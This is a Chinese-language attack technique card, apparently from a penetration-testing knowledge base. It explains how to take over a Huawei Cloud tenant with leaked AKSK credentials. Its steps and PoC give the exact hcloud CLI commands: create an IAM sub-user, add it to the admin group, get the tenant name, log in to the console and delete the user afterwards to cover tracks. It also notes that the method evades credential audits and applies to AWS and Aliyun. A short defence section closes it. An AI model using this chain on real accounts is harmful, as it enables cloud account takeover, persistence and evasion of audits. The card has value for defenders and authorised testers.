---
id: huawei-obs-aksk-iam-console-takeover
title: 泄露的华为云 AKSK 创建 IAM 子账户加入管理组接管控制台
type: scenario
domain: cloud
path: cloud/cloud-iam
technique: iam-privilege-escalation
aliases:
- 华为云 AKSK 接管
- IAM 子账户提权接管控制台
tags:
- cloud
- iam
- huawei-cloud
- aksk
- console-takeover
severity: critical
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
---

## 一句话结论

拿到高权限华为云 AKSK 后，通过 hcloud CLI 创建 IAM 子账户、将其加入管理员用户组，再用租户名+子账户直接登录华为云控制台，实现对整个云租户资产的接管。

## 原理

AKSK 本质是具有 API 调用权限的长期凭证；若其关联账户具备 IAM 管理权限（如拥有创建用户、管理用户组的权限），攻击者可以不走"破解原账户密码"的路径，直接通过 API 派生一个自己掌握密码的子账户并授予管理员组，从而获得与控制台登录等价的持久化访问。控制台登录只需要租户名（KeystoneListAuthDomains 返回的 name）+子账户密码，整个操作完全通过公开 IAM API 完成，属凭证滥用的标准提权链。

## 触发条件

- 泄露的 AKSK 所属账户拥有 IAM 用户管理与用户组管理权限（高权账户）；
- 云账号未对"创建用户/加入管理组"等敏感 IAM 操作设置告警阻断或最小权限约束。

## 利用步骤

1. 导入 AKSK 到 hcloud CLI；
2. `hcloud IAM KeystoneCreateUser --user.password="..." --user.name="test"` 创建子账户并记录 user_id；
3. `hcloud IAM KeystoneListGroups` 列出用户组，找到管理员组 group_id；
4. `hcloud IAM KeystoneAddUserToGroup --group_id=<组id> --user_id=<子账户id>` 加入管理组；
5. `hcloud IAM KeystoneListAuthDomains` 获取租户名（返回的 name 字段）；
6. 用"租户名+子账户名/密码"登录华为云控制台，接管全部云资产；
7. 收尾用 `hcloud IAM KeystoneDeleteUser --user_id=<子账户id>` 删除痕迹。

## PoC

```bash
hcloud IAM KeystoneCreateUser  --user.password="Password@123_" --user.name="test"
hcloud IAM KeystoneListGroups
hcloud IAM KeystoneAddUserToGroup --group_id="组id" --user_id="用户id"
hcloud IAM KeystoneListAuthDomains
# 租户名 + 子账户登录控制台
```

## 变体与关联

- 同类思路适用于 AWS（create_user + attach policy + console login）、阿里云 RAM 等，仅 API 名称不同；
- AKSK 来源常见于 Nacos 配置、代码仓库、对象存储中的配置文件（见凭据收集相关卡）；
- 创建子账户而非直接使用原 AKSK，可绕过对原凭证的使用审计，且控制台登录与 API 行为分离。

## 检测与防御

- 对 IAM CreateUser/AddUserToGroup/Console 登录配置实时告警与审批流；
- AKSK 最小权限化，禁止业务凭证携带 IAM 管理权限；
- 定期轮换 AKSK，启用临时凭证（STS）替代长期 AKSK。
